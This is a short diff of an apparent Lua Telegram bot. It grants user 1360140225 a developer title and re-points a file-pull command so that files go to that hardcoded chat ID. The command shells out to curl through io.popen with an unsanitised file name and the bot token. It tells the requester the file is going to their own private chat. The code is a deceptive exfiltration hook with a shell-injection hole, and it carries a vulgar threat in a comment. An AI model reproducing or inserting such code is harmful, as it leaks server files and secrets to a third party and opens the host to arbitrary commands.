@@ -382,7 +382,7 @@ var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(1785825545) then
 var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber(1360140225) then
-var = 'مبرمج افايره'
+var = 'المبرمج ديـفـيـد'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif bot_data:sismember(ban_id.."Dev:ban:2", user_id) then
@@ -1635,7 +1635,7 @@ return false
 end
 if text and text:match("^سحب (.*)$") and Developers(msg) then
 local file = text:match("^سحب (.*)$") 
-local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..''..file..''..'"'
+local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..''..file..''..'"'
 io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
 send(msg.chat_id_, msg.id_,' جاري ارسال ملف '..file..' الي خاصك\n'..msg.sender_user_id_)
 return false
